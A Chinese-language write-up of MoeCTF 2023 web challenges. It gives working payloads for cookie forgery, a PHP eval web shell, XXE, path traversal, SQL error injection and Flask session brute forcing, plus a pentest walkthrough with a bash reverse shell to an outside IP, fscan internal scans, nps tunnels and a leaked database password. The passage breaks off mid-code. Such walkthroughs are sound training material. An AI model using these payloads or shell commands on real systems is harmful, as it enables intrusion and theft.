# MoeCTF 2023

## Web

### 入门指北

十六进制转字符串可以得到以下内容

```
flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=
```

再进行一次 base64 解码就可以得到 flag。

```
moectf{w3lCome_To_moeCTF_W2b_challengE!!}
```

### http

Payload 如下

```http
Param: UwU=u
Body: Luv=u
X-Forwarded-For: 127.0.0.1
Cookie: character=admin
User-Agent: MoeBrowser
```

moectf{basic\_http\_knowledge\_Xcpf6zq45VutatFPmmelppGUvZpFN\_yK}

### cookie

注册 `POST /register`

```json
{
    "username":"koito1",
    "password":"123456"
}
```

登录 `POST /login`

```json
{
    "username":"koito1",
    "password":"123456"
}
```

获取flag `GET /flag` ，回显没管理员权限，Cookie 存在 Token，将 Token 通过 base64 解码可以得到以下内容

```json
{"username": "koito1", "password": "123456", "role": "user"}
```

修改成以下内容

```json
{"username": "koito1", "password": "123456", "role": "admin"}
```

并通过 base64 进行编码，并构造 Payload 如下

```http
Cookie: character=admin; token=eyJ1c2VybmFtZSI6ICJrb2l0bzEiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ==
```

即可获取 flag `moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}` 。

### 彼岸的flag

打开源代码梭哈。

### gas!gas!gas!

```python
import requests
import time
session = requests.Session()

url = "http://localhost:60043/"

def car():
    data = {
        "driver": "1",
        "steering_control": "0",
        "throttle": "2"
    }
    for _ in range(0, 7):
        time.sleep(0.1)
        ret = session.post(url, data=data)
        print(data)
        #print(ret.text)
        if "弯道向右" in ret.text:
            data["steering_control"] = "-1"
            print("弯道向右")
        if "弯道直行" in ret.text:
            data["steering_control"] = "0"
            print("弯道直行")
        if "弯道向左" in ret.text:
            data["steering_control"] = "1"
            print("弯道向左")
        if "抓地力太大了！" in ret.text:
            data["throttle"] = "2"
            print("抓地力太大了！")
        if "保持这个速度" in ret.text:
            data["throttle"] = "1"
            print("保持这个速度")
        if "抓地力太小了！" in ret.text:
            data["throttle"] = "0"
            print("抓地力太小了！")
        if "失误了！别紧张，车手，重新来过吧" in ret.text:
            print("失误了！别紧张，车手，重新来过吧")
            return 0
        if "moectf{" in ret.text:
            print(ret.text)
            return 1


car()
```

moectf{Beautiful\_Drifting!!\_EUbAUerqztK\_HgTz73ykI5tjKTs6ZkTb}

### 大海捞针

```python
import requests
import time

url = "http://localhost:62225/"

def flag():
    for i in range(584, 1001):
        time.sleep(0.03)
        print("{0}..".format(i))
        ret = requests.get(url, params={
            "id": i
        })
        print(ret.text)
        if "moectf{" in ret.text:
            print(ret.text)
            return 1


flag()
```

flag 在 id `920` 中，moectf{script\_helps\_W4ybDNdcii8fJu2uinmgRX6XNZ0PxVOF}

### signin

#### 0x02 收集信息

```python
assert "admin" in users
assert users["admin"] == "admin"
```

得知 `admin` 密码为 `admin` 。

#### 0x01 分析 eval

这串代码存在一个离谱的地方，就是这个 eval 函数，一步步来。

```python
eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,"big",signed=True).decode().translate({ord(c):None for c in "\x00"})) # what is it?
```

`int.to_bytes()` 函数会将一个整数转化为其字节表示，其中一个十六进制数和一个大整数进行异或，将异或的结果转化为160字节长度的字节串，并且是 big endian 字节顺序，再通过 `.decode()` 将字节转换成字符串，通过 `.translate({ord(c):None for c in "\x00"})` 移除了所有的 `\x00` 的字节最后传递给 `eval()` 函数进行执行。

```python
print(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,"big",signed=True).decode().translate({ord(c):None for c in "\x00"}))
# [[0] for base64.b64encode in [base64.b64decode]]
```

也就是说，`base64.b64encode` 其实是 `base64.b64decode` ，因此下方的 `decrypt()` 函数其实是下面这样的。

```python
def decrypt(data:str):
        for x in range(5):
            data = base64.b64decode(data).decode()
        return data
```

#### 0x03 分析 gethash

```python
def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f"{salt}[{item}]{salt}".encode()).digest(), "big") # it looks so complex! but is it safe enough?
    return hex(c)[2:]
```

程序会 `hashed_users = dict((k,gethash(k,v)) for k,v in users.items())` 生成一个 dict 存放 username 和其根据 `gethash()` 函数所得到的值，但是当账号和密码相同时，`gethash()` 函数均返回 `0` 。以 `{"admin": "admin"}` 为例子，通过运行以上代码可以得到类似回显。

```
item:admin
c:102686882367982976480853838608729908860
item:admin
c:0
```

#### 0x04 FLAG 获得方法

```python
hashed = gethash(params.get("username"), params.get("password"))
for k, v in hashed_users.items():
    if hashed == v:
        data = {
            "user": k,
            "hash": hashed,
            "flag": FLAG if k == "admin" else "flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}"
        }
        self.send_response(200)
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
        print("success")
        return
```

要获得 FLAG 需要使得 `hashed == v` ，也就是说需要使得 `hashed` 的值为 `0` ，因为 `admin` 的 hash 值为 `0` ，但是还需要通过某个手段来绕过这段代码的限制。

```python
if params.get("username") == params.get("password"):
    self.send_response(403)
    self.end_headers()
    self.wfile.write(b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!")
    print("same")
    return
```

通过构造

```json
{"username":1,"password":"1"}
```

进行 5 次 base64 编码得到

```
VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsVmFSRXB6WVd4SmQxZHFXbHBsYXpWeVdrY3hUMlJHVmxoaVJrSm9WbGQzTUZVeFl6QmtNVUpTVUZRd1BRPT0=
```

后构造 Payload 如下

```json
{"params":"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsVmFSRXB6WVd4SmQxZHFXbHBsYXpWeVdrY3hUMlJHVmxoaVJrSm9WbGQzTUZVeFl6QmtNVUpTVUZRd1BRPT0="}
```

即可得到回显如下

```json
{"user": "admin",
 "hash": "0",
 "flag": "moectf{C0nGUrAti0ns!_y0U_hAve_sUCCessFUlly_siGnin!_iYlJf!M3rux9G9Vf!Jox}"
}
```

### moe图床

通过访问 `./upload.php` 可以得到内容如下

```php
<?php
$targetDir = 'uploads/';
$allowedExtensions = ['png'];


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $tmp_path = $_FILES['file']['tmp_name'];

    if ($file['type'] !== 'image/png') {
        die(json_encode(['success' => false, 'message' => '文件类型不符合要求']));
    }

    if (filesize($tmp_path) > 512 * 1024) {
        die(json_encode(['success' => false, 'message' => '文件太大']));
    }

    $fileName = $file['name'];
    $fileNameParts = explode('.', $fileName);

    if (count($fileNameParts) >= 2) {
        $secondSegment = $fileNameParts[1];
        if ($secondSegment !== 'png') {
            die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
        }
    } else {
        die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
    }

    $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']);

    if (move_uploaded_file($tmp_path, $uploadFilePath)) {
        die(json_encode(['success' => true, 'file_path' => $uploadFilePath]));
    } else {
        die(json_encode(['success' => false, 'message' => '文件上传失败']));
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

通过分析可以得知只对文件名的第二部分进行校对，因此可以通过修改文件名为 `shell.png.php` 进行绕过，构造 Payload 如下

```
<?php eval($_POST[1]); ?>
```

通过蚁剑一把梭可以得到 flag 如下

```
moectf{hmmm_improper_filter_UHTtyCKaTduCaSvieWWJwjduiQz-SEqV}
```

### 了解你的座驾

通过 Network 可以发现 POST 请求，发现 xml ，尝试 XXE ，构造 Payload如下

```
xml_content=%0d%3c!DOCTYPE%20shell%5b%0d%0a%3c!ENTITY%20en%20SYSTEM%20%22%2fflag%22%3e%0d%0a%5d%3e%0a%3cxml%3e%3cname%3e1%26en%3b2%3c%2fname%3e%3c%2fxml%3e
```

即可得到 flag 如下

```
moectf{Which_one_You've_Chosen?xK1hOAilRmh6oK1kQehxQefFcpFo29ME}
```

### meo图床

通过上传图片后，可以得到以下 url

```
http://localhost:59661/images.php?name=64dba568f03b0_1.png
```

使用目录穿越查看根目录的 `/flag` ，url 如下

```
http://localhost:59661/images.php?name=../../../../../../flag
```

可以得到以下内容

```
hello~
Flag Not Here~
Find Somewhere Else~


<!--Fl3g_n0t_Here_dont_peek!!!!!.php-->

Not Here~~~~~~~~~~~~~ awa
```

通过访问 `Fl3g_n0t_Here_dont_peek!!!!!.php` 可以得到以下内容

```php
<?php

highlight_file(__FILE__);

if (isset($_GET['param1']) && isset($_GET['param2'])) {
    $param1 = $_GET['param1'];
    $param2 = $_GET['param2'];

    if ($param1 !== $param2) {
        
        $md5Param1 = md5($param1);
        $md5Param2 = md5($param2);

        if ($md5Param1 == $md5Param2) {
            echo "O.O!! " . getenv("FLAG");
        } else {
            echo "O.o??";
        }
    } else {
        echo "o.O?";
    }
} else {
    echo "O.o?";
}

?> O.o?
```

分析得知是 md5 绕过，通过构造 Payload 如下

```
param1=s878926199a&param2=s155964671a
```

就可以到 flag 如下

```
moectf{oops_file_get_contents_controllable_lWpZo5UIiqnxK8URcmyyVmfrVt_M9EtF}
```

### 夺命十三枪

```php
// index.php
<?php
highlight_file(__FILE__);
require_once('Hanxin.exe.php');
$Chant = isset($_GET['chant']) ? $_GET['chant'] : '夺命十三枪';
$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);
$before = serialize($new_visitor);
$after = Deadly_Thirteen_Spears::Make_a_Move($before);
echo 'Your Movements: ' . $after . '<br>';
try{
    echo unserialize($after);
}catch (Exception $e) {
    echo "Even Caused A Glitch...";
}
?>

// Hanxin.exe.php
<?php
if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    highlight_file(__FILE__);
}
class Deadly_Thirteen_Spears{
    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
        "di_yi_qiang" => "Lovesickness",
        "di_er_qiang" => "Heartbreak",
        "di_san_qiang" => "Blind_Dragon",
        "di_si_qiang" => "Romantic_charm",
        "di_wu_qiang" => "Peerless",
        "di_liu_qiang" => "White_Dragon",
        "di_qi_qiang" => "Penetrating_Gaze",
        "di_ba_qiang" => "Kunpeng",
        "di_jiu_qiang" => "Night_Parade_of_a_Hundred_Ghosts",
        "di_shi_qiang" => "Overlord",
        "di_shi_yi_qiang" => "Letting_Go",
        "di_shi_er_qiang" => "Decisive_Victory",
        "di_shi_san_qiang" => "Unrepentant_Lethality"
    );
    public static function Make_a_Move($move){
        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index => $movement){
            $move = str_replace($index, $movement, $move);
        }
        return $move;
    }
}
class Omg_It_Is_So_Cool_Bring_Me_My_Flag{
    public $Chant = '';
    public $Spear_Owner = 'Nobody';
    function __construct($chant){
        $this->Chant = $chant;
        $this->Spear_Owner = 'Nobody';
    }
    function __toString(){
        if($this->Spear_Owner !== 'MaoLei'){
            return 'Far away from COOL...';
        }
        else{
            return "Omg You're So COOOOOL!!! " . getenv('FLAG');
        }
    }
}
?>
```

#### 0x00 POP 链

```
Omg_It_Is_So_Cool_Bring_Me_My_Flag::__construct()->Omg_It_Is_So_Cool_Bring_Me_My_Flag::__toString()
```

```
http://localhost:61356/?chant=di_jiu_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}
```

### 出去旅游的心海

打开发现 `/wordpress` ，用 WPSCAN 扫发现没有什么可用的东西，扫不出漏洞插件，只能知道 WordPress 的版本，通过查看网页源代码可以发现一个 API 如下

```
wp-content/plugins/visitor-logging/logger.php
```

通过访问可以得到 `logger.php` 源码如下

```php
<?php
/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor's identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/

// 不许偷看！这些代码我还在调试呢！
highlight_file(__FILE__);

// 加载数据库配置，暂时用硬编码绝对路径
require_once('/var/www/html/wordpress/' . 'wp-config.php');

$db_user = DB_USER; // 数据库用户名
$db_password = DB_PASSWORD; // 数据库密码
$db_name = DB_NAME; // 数据库名称
$db_host = DB_HOST; // 数据库主机

// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
// 这些是临时的代码

$ip = $_POST['ip'];
$user_agent = $_POST['user_agent'];
$time = stripslashes($_POST['time']);

$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

// 检查连接是否成功
if ($mysqli->connect_errno) {
    echo '数据库连接失败: ' . $mysqli->connect_error;
    exit();
}

$query = "INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)";

// 执行插入
$result = mysqli_query($mysqli, $query);

// 检查插入是否成功
if ($result) {
    echo '数据插入成功';
} else {
    echo '数据插入失败: ' . mysqli_error($mysqli);
}

// 关闭数据库连接
mysqli_close($mysqli);

//gpt真好用
```

通过分析代码可知可以进行 SQL 报错注入，那就试试！

构造 Payload 如下

```
ip=1&user_agent=1&time='2023-08-28 16:15:40' or updatexml(1,concat(0x7e,database()),0)
```

可以得到数据库名 `wordpress` ，构造 Payload 如下

```
ip=1&user_agent=1&time='' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='wordpress')),0)
```

可以得到表名 `secret_of_kokomi, visitor_record` ，构造 Payload 如下

```
ip=1&user_agent=1&time='' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='wordpress' and table_name='secret_of_kokomi')),0)
```

可以得到字段名 `content, id` ，构造 Payload 如下

```
ip=1&user_agent=1&time='' or updatexml(1,concat(0x7e,(select group_concat(content) from secret_of_kokomi)),0)
```

可以得到 `id` 字段的全部内容 `1,2,3` ，这时候就觉得怪了，这边 3 个，上面 `content` 字段就两个，不对哇，那就构造 Payload 如下看看

```
ip=1&user_agent=1&time='' or updatexml(1,concat(0x7e,(select group_concat(content) from secret_of_kokomi where id='3')),0)
```

可以得到回显如下

```
moectf{Dig_Thr0ugh_Eve2y_C0de_3
```

哦？这不是 flag 嘛，用 `mid()` 函数截取输出下，Payload 如下

```
ip=1&user_agent=1&time='' or updatexml(1,concat(0x7e,mid((select group_concat(content) from secret_of_kokomi where id='3'),20)),0)
```

可以得到回显如下

```
Eve2y_C0de_3nd_Poss1bIlIti3s!!}
```

拼起来就可以得到 flag 如下

```
moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}
```

### moeworld

下载附件可以得到加密的压缩包 `hint.zip` 以及 题目描述一份。

```
本题你将扮演**红队**的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag

题目环境：http://47.115.201.35:8000/

在本次公共环境中渗透测试中，希望你**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**

**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**

hint.zip 密码请在拿到外网靶机后访问根目录下的**readme**，完成条件后获取

环境出现问题，请第一时间联系出题人**xlccccc**

对题目有疑问，也可随时询问出题人
```

#### 0x00 信息收集

通过扫描靶机 IP 端口可以扫出以下内容

* 80
* 8000
* 8080
* 7777
* 22
* 8777

访问题目环境显示的是一个留言板，通过对 8000 端口进行目录扫描

```bash
$ dirsearch -u http://47.115.201.35:8000/
[12:45:54] 200 -    1KB - /change                                           
[12:45:57] 200 -    2KB - /console                                          
[12:46:04] 302 -  199B  - /index  ->  /login                                
[12:46:06] 200 -    1KB - /login                                            
[12:46:07] 200 -   74B  - /logout                                           
[12:46:15] 200 -  966B  - /register 
```

可以得到该站点存在以下路径可以访问

* /change
* /console - Werkzeug Debugger
* /index
* /login
* /logout
* /register

通过随便注册一个账号可以发现如下内容

```
admin
2023-08-01 19:22:07
记录一下搭建留言板的过程
首先确定好web框架，笔者选择使用简单的flask框架。
然后使用强且随机的字符串作为session的密钥。
app.secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()
最后再写一下路由和数据库处理的函数就完成啦！！
身为web手的我为了保护好服务器，写代码的时候十分谨慎，一定不会让有心人有可乘之机！
```

在 Header - Cookie 可以看到以下内容

```http
Cookie: session=eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMzM0NSJ9.ZO8JIQ.2Fe5uGvbCEcDs3iqMVW0vYhB4hQ
```

访问 `/console` 可以发现是一个 Werkzeug Debugger 但是需要 PIN 才能解开，给了 `app.secret_key` 的 Hint 那就先试试伪造 Session 吧。

#### 0x01 Flask Session 伪造

> https://github.com/noraj/flask-session-cookie-manager

通过分析 secret\_key 的生成方式可以得知只需要猜出 `os.urandom(2).hex()` 生成的随机值就行，这个随机值的范围是 `0000-ffff` （通过本地输出该函数发现是小写字母），通过结合 `flask-session-cookie-manager3.py` 编写一个脚本进行爆破。

通过上方的抓包获取到的 Session 用 `flask-session-cookie-manager3.py` 进行 decode 可以得到结构如下

```json
{
    "power": "guest",
    "user": "123345"
}
```

也可以通过 https://www.kirsle.net/wizards/flask-session.cgi 在线 Decode。

使用脚本前需要修改脚本中 `session` 的 `user` 值，确保当前用户存在（

```python
import os
import requests
import itertools
from itsdangerous import base64_decode
import ast
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

class FSCM():
    @staticmethod
    def encode(secret_key, session_cookie_structure):
        try:
            app = MockApp(secret_key)
            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)
            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e

    @staticmethod
    def decode(session_cookie_value, secret_key=None):
        try:
            if secret_key is None:
                compressed = False
                payload = session_cookie_value
                if payload.startswith('.'):
                    compressed = True
                    payload = payload[1:]
                data = payload.split(".")[0]
                data = base64_decode(data)
                if compressed:
                    data = zlib.decompress(data)
                return data
            else:
                app = MockApp(secret_key)
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)
                return s.loads(session_cookie_value)
        except Exception as e:
            return "[Decoding error] {}".format(e)
            raise e

def test_key(randomHex):
    print(randomHex)
    session = FSCM.encode("This-random-secretKey-you-can't-get{0}".format(randomHex), '{"power": "guest","user": "fdasfdsa"}')
    headers = {"Cookie": f"session={session}"}
    data = {'message': 'test'}
    ret = requests.post('http://47.115.201.35:8000', headers=headers, data=data)
    print(ret.status_code)
    print(session)
    print('=========')
    if 'upload successfully' in ret.text:
        return (randomHex, session, ret.text)
    return None

hex_digits = '0123456789ABCDEF'
combinations = [''.join(comb).lower() for comb in itertools.product(hex_digits, repeat=4)]

for combination in combinations:
    result = test_key(combination)
    if result:
        print(result[0])
        print(result[1])
        print(result[2])
        break
        
"""
06f0
eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImZkYXNmZHNhIn0.ZO7ASA.7z7ikCoBWPTz0iyHgPENP_TTvQw
<script>alert("upload successfully");window.location.href="/index";</script>
"""
```

因此可以得到 `os.urandom(2).hex()` 生成的值为 `06f0` ，`secret_key` 的值也就是 `This-random-secretKey-you-can't-get06f0` 。

通过 flask-session-cookie-manager 进行 encode 就可以进行 Session 伪造成 admin 了，具体操作如下

```bash
$ python flask_session_cookie_manager3.py encode -t '{\"power\": \"admin\",\"user\": \"admin\"}' -s "This-random-secretKey-you-can't-get06f0" 
eyJwb3dlciI6ImFkbWluIiwidXNlciI6ImFkbWluIn0.ZO7MYg.HmVA8P4WT3h5qsDKMvAES1OwmJI
```

通过 BurpSuite 修改下 Cookie 中的 Session 就可以伪装成 admin 用户了，通过访问就可以得到以下内容。

<figure><img src=".gitbook/assets/moeworld-1.png" alt=""><figcaption></figcaption></figure>

可以得到 PIN 码是 `904-474-531` ，那下一步就是去获取 Console

#### 0x02 获取 Console

在 `/console` 页面输入 PIN 码后即可使用控制台，可以通过 Console 来反弹 Shell，可以选择在自己服务器上搭建一个 [nps](https://github.com/ehang-io/nps) ，可以看看 [官方文档](https://ehang-io.github.io/nps/#/install) 。安装完成后在 Linux 装上客户端，通过服务端的 `客户端 - 新增` 后生成的唯一验证密钥（Unique verify Key）进行连接，具体方法如下

```bash
$ ./npc -server=<nsp服务端 IP>:8024 -vkey=<Unique verify Key>
```

> 如果服务器带了防火墙的，务必记得去开放端口，为了安全推荐使用不常用端口并限制源。

连接后，先进行一个端口监听。

```bash
nc -lvvp 2333
```

然后在 Console 进行反弹 Shell，具体如下

```python
print(os.system("bash -c 'bash -i >& /dev/tcp/20.2.216.21/2333 0>&1'"))
```

就可以获得留言板所在容器的 Shell 了，通过题目描述中的内容，获取 `readme` 的内容，

```bash
root@66ff0435ac92:/app# cat /readme
cat /readme
恭喜你通过外网渗透拿下了本台服务器的权限
接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan
你需要了解它的基本用法，然后扫描内网的ip段
如果你进行了正确的操作，会得到类似下面的结果
10.1.11.11:22 open
10.1.23.21:8080 open
10.1.23.23:9000 open
将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）
注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务
对密码有疑问随时咨询出题人
```

之后还可以获取 `flag` 的内容，

```bash
root@66ff0435ac92:/app# cat /flag
cat /flag
Oh! You discovered the secret of my blog.
But I divided the flag into three sections,hahaha.
This is the first part of the flag
moectf{Information-leakage-Is-dangerous!
```

下一步的操作就是扫内网 IP 段了。

#### 0x03 获取压缩包密码

通过获取 hosts 内容可以得到以下内容

```bash
root@66ff0435ac92:/app# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.20.0.4      66ff0435ac92
172.21.0.2      66ff0435ac92
```

可以得到存在另外两个 IP `172.20.0.4` 和 `172.21.0.2` 。

通过对这两个 IP 进行扫描可以得到以下内容

```bash
root@66ff0435ac92:/app# /app/tools/fscan -h 172.21.0.2/16
/app/tools/fscan -h 172.21.0.2/16
start infoscan
(icmp) Target 172.21.0.1      is alive
(icmp) Target 172.21.0.2      is alive
[*] LiveTop 172.21.0.0/16    段存活数量为: 2
[*] LiveTop 172.21.0.0/24    段存活数量为: 2
[*] Icmp alive hosts len is: 2
172.21.0.1:8000 open
172.21.0.1:888 open
172.21.0.1:8080 open
172.21.0.2:8080 open
172.21.0.1:3306 open
172.21.0.1:443 open
172.21.0.1:80 open
172.21.0.1:22 open
172.21.0.1:21 open
172.21.0.1:7777 open
172.21.0.1:10001 open
[*] alive ports len is: 11
start vulscan
[*] WebTitle: http://172.21.0.1:888     code:403 len:548    title:403 Forbidden
[*] WebTitle: http://172.21.0.1:8080    code:302 len:35     title:None 跳转url: http://172.21.0.1:8080/login/index
[*] WebTitle: http://172.21.0.1:8000    code:302 len:199    title:Redirecting... 跳转url: http://172.21.0.1:8000/login
[*] WebTitle: http://172.21.0.1         code:200 len:138    title:404 Not Found
[*] WebTitle: http://172.21.0.2:8080    code:302 len:199    title:Redirecting... 跳转url: http://172.21.0.2:8080/login
[*] WebTitle: http://172.21.0.1:7777    code:200 len:917    title:恭喜，站点创建成功！
[*] WebTitle: http://172.21.0.1:8000/login code:200 len:1145   title:LOGIN
[*] WebTitle: http://172.21.0.1:8080/login/index code:200 len:3617   title:None
[*] WebTitle: http://172.21.0.2:8080/login code:200 len:1145   title:LOGIN

root@66ff0435ac92:/app# /app/tools/fscan -h 172.20.0.4/16
/app/tools/fscan -h 172.20.0.4/16
start infoscan
(icmp) Target 172.20.0.1      is alive
(icmp) Target 172.20.0.2      is alive
(icmp) Target 172.20.0.3      is alive
(icmp) Target 172.20.0.4      is alive
[*] LiveTop 172.20.0.0/16    段存活数量为: 4
[*] LiveTop 172.20.0.0/24    段存活数量为: 4
[*] Icmp alive hosts len is: 4
172.20.0.1:80 open
172.20.0.2:22 open
172.20.0.1:22 open
172.20.0.1:21 open
172.20.0.1:443 open
172.20.0.4:8080 open
172.20.0.1:8080 open
172.20.0.2:6379 open
172.20.0.3:3306 open
172.20.0.1:3306 open
172.20.0.1:888 open
172.20.0.1:7777 open
172.20.0.1:10001 open
[*] alive ports len is: 13
start vulscan
[+] Redis:172.20.0.2:6379 unauthorized file:/data/dump.rdb
[+] Redis:172.20.0.2:6379 like can write /root/.ssh/
[*] WebTitle: http://172.20.0.1         code:200 len:138    title:404 Not Found
[*] WebTitle: http://172.20.0.1:8080    code:302 len:35     title:None 跳转url: http://172.20.0.1:8080/login/index
[*] WebTitle: http://172.20.0.1:888     code:403 len:548    title:403 Forbidden
[*] WebTitle: http://172.20.0.1:8080/login/index code:200 len:3617   title:None
[*] WebTitle: http://172.20.0.1:7777    code:200 len:917    title:恭喜，站点创建成功！
[*] WebTitle: http://172.20.0.4:8080    code:302 len:199    title:Redirecting... 跳转url: http://172.20.0.4:8080/login
[*] WebTitle: http://172.20.0.4:8080/login code:200 len:1145   title:LOGIN
已完成 12/13 [-] ssh 172.20.0.1:22 root root#123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
```

按照题目描述的提示去掉 `.1` 结尾的 IP 可以得到压缩包的密码如下

```
8080
22-3306-6379-8080
```

通过尝试发现下面那个是 `hint.zip` 的密码，解压后打开（丢 Linux 里面打开）来可以得到 Hint 如下

```
当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件
连接代理，推荐`proxychains`
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
```

#### 0x04 获取 flag2

提示中已经讲明了在 `/app/tools` 有 [nps](https://github.com/ehang-io/nps) ，那就继续用 nps 吧。这里的 nps 是客户端，我们需要在我们的服务端（在自己搭建的 nps 所在的服务器）的 `客户端` 中新增一个供靶机进行内网渗透用，在获取到的靶机 Shell 中进行连接

```bash
root@05551bd5dd95:/app/tools# ./npc -server=<nsp服务端 IP>:8024 -vkey=<Unique verify Key>
<npc -server=<nsp服务端 IP>:8024 -vkey=<Unique verify Key>
```

连接成功后在 `客户端` 找到靶机所连接的 客户端 ID ，点击隧道，新增 **TCP** 隧道，服务器端口根据自行进行调节，我的设置如下

* ssh
  * 服务端端口 - 2222
  * 目标 (IP:端口) - 172.20.0.2:22
* redis
  * 服务端端口 - 6379
  * 目标 (IP:端口) - 172.20.0.2:6379
* mysql
  * 服务端端口 - 3309
  * 目标 (IP:端口) - 172.20.0.3:3306

设置完后，通过打印 `/app` 路径的文件及目录可以发现以下内容

```bash
root@05551bd5dd95:/app# ls
ls
__pycache__
app.py
dataSql.py
getPIN.py
static
tools
```

通过 cat 可以获取 `dataSql.py` 的内容如下

```python
root@05551bd5dd95:/app# cat dataSql.py
cat dataSql.py
import pymysql
import time
import getPIN

pin = getPIN.get_pin()

class Database:
    def __init__(self, max_retries=3):
        self.max_retries = max_retries
        self.db = None

    def __enter__(self):
        self.db = self.connect_to_database()
        return self.db, self.db.cursor()

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.db and self.db.open:
            self.db.close()

    def connect_to_database(self):
        retries = 0
        while retries < self.max_retries:
            try:
                db = pymysql.connect(
                    host="mysql",  # 数据库地址
                    port=3306,  # 数据库端口
                    user="root",  # 数据库用户名
                    passwd="The_P0sswOrD_Y0u_Nev3r_Kn0w",  # 数据库密码
                    database="messageboard",  # 数据库名
                    charset='utf8'
                )
                return db
            except pymysql.Error as e:
                retries += 1
                print(f"Connection attempt {retries} failed. Retrying in 5 seconds...")
                time.sleep(5)
        raise Exception("Failed to connect to the database after maximum retries.")

def canLogin(username,password):
    with Database() as (db, cursor):
        sql = 'select password from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if res[0][0] == password:
                return True
        return False

def register(id,username,password,power):
    with Database() as (db, cursor):
        sql = 'select username from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            return False
        else:
            sql = 'insert into users (id,username,password,power) values (%s,%s,%s,%s)'
            cursor.execute(sql, (id,username,password,power))
            db.commit()
            return True

def changePassword(username,oldPassword,newPassword):
    with Database() as (db, cursor):
        sql = 'select password from users where username=%s'
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if oldPassword == res[0][0]:
                sql = 'update users set password=%s where username=%s'
                cursor.execute(sql, (newPassword,username))
                db.commit()
                return True
            else:
                return "wrong password"
        else:
            return "username doesn't exist."

def uploadMessage(username,message,nowtime,private):
    with Database() as (db, cursor):
        sql = 'insert into message (username,data,time,private) values (%s,%s,%s,%s)'
        cursor.execute(sql, (username,message,nowtime,private))
        db.commit()
        return True

def showMessage():
    with Database() as (db, cursor):
        sql = 'select * from message'
        cursor.execute(sql)
        res = cursor.fetchall()
        res = [tuple([str(elem).replace('128-243-397', pin) for elem in i]) for i in res]
        return res

def usersName():
    with Database() as (db, cursor):
        sql = 'select * from users'
        cursor.execute(sql)
